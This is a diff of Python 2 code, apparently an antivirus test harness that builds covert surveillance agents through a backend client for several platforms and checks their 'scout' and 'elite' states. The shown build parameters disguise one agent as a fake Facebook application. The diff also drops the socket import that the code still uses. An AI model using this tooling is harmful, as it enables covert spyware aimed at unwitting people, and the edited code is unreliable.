@@ -1,5 +1,4 @@
 import os
-import sys
 import shutil
 from time import sleep
 import time
@@ -20,8 +19,6 @@ from ConfigParser import ConfigParser
 from rcs_client import Rcs_client
 import logger
 import redis
-import socket
-
 
 from urllib2 import HTTPError
 
@@ -61,7 +58,7 @@ def check_internet(address, queue):
     #     ret |= False
 
     try:
-        if(ret == False):
+        if(ret is False):
             response = urllib2.urlopen('http://' + address, timeout=10)
             # print "i reach url: ", address
             ret |= True
@@ -120,7 +117,8 @@ class connection:
 
 class AVAgent:
 
-    def __init__(self, backend, frontend=None, platform='windows', kind='silent', ftype='desktop', blacklist=[]):
+    def __init__(self, backend, frontend=None, platform='windows', kind='silent',
+                 ftype='desktop', blacklist=[]):
         self.kind = kind
         self.host = (backend, frontend)
         if "winxp" in socket.gethostname():
@@ -172,7 +170,9 @@ class AVAgent:
                 target_id = c.target_create(
                     operation_id, target, 'made by vmavtest at %s' % time.ctime())
             factory_id, ident = c.factory_create(
-                operation_id, target_id, self.ftype, factory, 'made by vmavtestat at %s' % time.ctime())
+                operation_id, target_id, self.ftype, factory,
+                'made by vmavtestat at %s' % time.ctime()
+            )
 
             with open(config) as f:
                 conf = f.read()
@@ -189,29 +189,33 @@ class AVAgent:
     def _build_agent(self, factory, melt=None, demo=False, tries=0):
         with connection() as c:
             params = {}
-            params['blackberry'] = {'platform': 'blackberry',
-                                    'binary': {'demo': demo},
-                                    'melt': {'appname': 'facebook',
-                                             'name': 'Facebook Application',
-                                             'desc': 'Applicazione utilissima di social network',
-                                             'vendor': 'face inc',
-                                             'version': '1.2.3'},
-                                    'package': {'type': 'local'}}
+            params['blackberry'] = {
+                'platform': 'blackberry',
+                'binary': {'demo': demo},
+                'melt': {'appname': 'facebook',
+                         'name': 'Facebook Application',
+                         'desc': 'Applicazione utilissima di social network',
+                         'vendor': 'face inc',
+                         'version': '1.2.3'},
+                'package': {'type': 'local'}}
 
-            params['windows'] = {'platform': 'windows',
-                                 'binary': {'demo': demo, 'admin': False},
-                                 'melt': {'scout': True, 'admin': False, 'bit64': True, 'codec': True},
-                                 'sign': {}
-                                 }
-            params['android'] = {'platform': 'android',
-                                 'binary': {'demo': demo, 'admin': False},
-                                 'sign': {},
-                                 'melt': {}
-                                 }
-            params['linux'] = {'platform': 'linux',
-                               'binary': {'demo': demo, 'admin': False},
-                               'melt': {}
-                               }
+            params['windows'] = {
+                'platform': 'windows',
+                'binary': {'demo': demo, 'admin': False},
+                'melt': {'scout': True, 'admin': False, 'bit64': True, 'codec': True},
+                'sign': {}
+                }
+            params['android'] = {
+                'platform': 'android',
+                'binary': {'demo': demo, 'admin': False},
+                'sign': {},
+                'melt': {}
+                }
+            params['linux'] = {
+                'platform': 'linux',
+                'binary': {'demo': demo, 'admin': False},
+                'melt': {}
+                }
             params['osx'] = {'platform': 'osx',
                              'binary': {'demo': demo, 'admin': True},
                              'melt': {}
@@ -366,7 +370,7 @@ class AVAgent:
         with connection() as c:
             info = c.instance_info(instance_id)
             print 'DBG _check_elite %s' % info
-            ret = info['upgradable'] == False and info['scout'] == False
+            ret = info['upgradable'] is False and info['scout'] is False
 
             if ret:
                 print "+ SUCCESS ELITE SYNC"
@@ -386,10 +390,10 @@ class AVAgent:
             info = c.instance_info(instance_id)
             if ret:
                 #assert info['upgradable'] == True
-                assert info['scout'] == True
+                assert info['scout'] is True
             else:
                 #assert info['upgradable'] == False
-                assert info['scout'] == True
+                assert info['scout'] is True
             return ret
 
     def _list_processes(self):
@@ -402,8 +406,12 @@ class AVAgent:
     def create_user_machine(self):
         print "create_user_machine"
         privs = [
-            'ADMIN', 'ADMIN_USERS', 'ADMIN_OPERATIONS', 'ADMIN_TARGETS', 'ADMIN_AUDIT', 'ADMIN_LICENSE', 'SYS', 'SYS_FRONTEND', 'SYS_BACKEND', 'SYS_BACKUP', 'SYS_INJECTORS', 'SYS_CONNECTORS', 'TECH',
-            'TECH_FACTORIES', 'TECH_BUILD', 'TECH_CONFIG', 'TECH_EXEC', 'TECH_UPLOAD', 'TECH_IMPORT', 'TECH_NI_RULES', 'VIEW', 'VIEW_ALERTS', 'VIEW_FILESYSTEM', 'VIEW_EDIT', 'VIEW_DELETE', 'VIEW_EXPORT', 'VIEW_PROFILES']
+            'ADMIN', 'ADMIN_USERS', 'ADMIN_OPERATIONS', 'ADMIN_TARGETS', 'ADMIN_AUDIT',
+            'ADMIN_LICENSE', 'SYS', 'SYS_FRONTEND', 'SYS_BACKEND', 'SYS_BACKUP',
+            'SYS_INJECTORS', 'SYS_CONNECTORS', 'TECH',
+            'TECH_FACTORIES', 'TECH_BUILD', 'TECH_CONFIG', 'TECH_EXEC', 'TECH_UPLOAD',
+            'TECH_IMPORT', 'TECH_NI_RULES', 'VIEW', 'VIEW_ALERTS', 'VIEW_FILESYSTEM',
+            'VIEW_EDIT', 'VIEW_DELETE', 'VIEW_EXPORT', 'VIEW_PROFILES']
         user_name = "avmonitor_%s" % self.hostname
         connection.user = user_name
 
